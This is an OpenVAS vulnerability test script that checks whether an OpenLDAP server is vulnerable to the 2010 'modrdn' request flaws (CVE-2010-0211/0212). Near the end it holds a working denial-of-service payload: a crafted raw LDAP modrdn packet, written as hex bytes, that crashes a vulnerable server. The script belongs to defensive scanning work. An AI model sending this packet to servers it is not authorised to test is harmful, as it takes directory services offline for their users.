###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openldap_41770.nasl 14 2013-10-27 12:33:37Z jan $
#
# OpenLDAP 'modrdn' Request Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "OpenLDAP is prone to multiple vulnerabilities.

Successfully exploiting these issues allows remote attackers to
execute arbitrary code in the context of the application or cause denial-of-
service conditions.

OpenLDAP 2.4.22 is vulnerable; other versions may also be affected.";

tag_solution = "The vendor has released an update to address this issue. Please see
the references for more information.";

if (description)
{
 script_id(100720);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-07-20 13:16:59 +0200 (Tue, 20 Jul 2010)");
 script_bugtraq_id(41770);
 script_cve_id("CVE-2010-0211","CVE-2010-0212");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("OpenLDAP 'modrdn' Request Multiple Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41770");
 script_xref(name : "URL" , value : "http://www.openldap.org/software/release/changes.html");
 script_xref(name : "URL" , value : "http://www.openldap.org/its/index.cgi/Software%20Bugs?id=6570");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if installed OpenLDAP is vulnerable.");
 script_category(ACT_DENIAL);
 script_family("General");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("ldap_detect.nasl");
 script_require_ports("Services/ldap", 389);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("misc_func.inc");
include("ldap.inc");

if(safe_checks())exit(0);

port = get_kb_item("Services/ldap");
if(!port)port = 389;
if(!get_port_state(port))exit(0);


if(ldap_alive(port:port)) {

  soc = open_sock_tcp(port);
  if(!soc)exit(0);

  req = raw_string(0x30,0x0c,0x02,0x01,0x01,0x60,0x07,0x02,0x01,0x03,0x04,0x00,0x80,0x00);

  send(socket:soc, data:req);
  buf = recv(socket:soc, length:1);
  if( buf == NULL )exit(0);
  response = hexstr(buf);

  if(response =~ "^30$" ) {

    req = raw_string(0x30,0x2a,0x02,0x01,0x02,0x6c,0x25,0x04,0x18,0x63,0x6e,0x3d,0x73,0x6f,0x6d,0x65,
	             0x74,0x68,0x69,0x6e,0x67,0x2c,0x64,0x63,0x3d,0x61,0x6e,0x79,0x74,0x68,0x69,0x6e,
		     0x67,0x04,0x06,0x63,0x6e,0x3d,0x23,0x38,0x30,0x01,0x01,0x00);

    send(socket:soc, data:req);

    if(!ldap_alive(port:port)) {
      security_warning(port:port);
      exit(0);
    }  

  }  
}

exit(0);
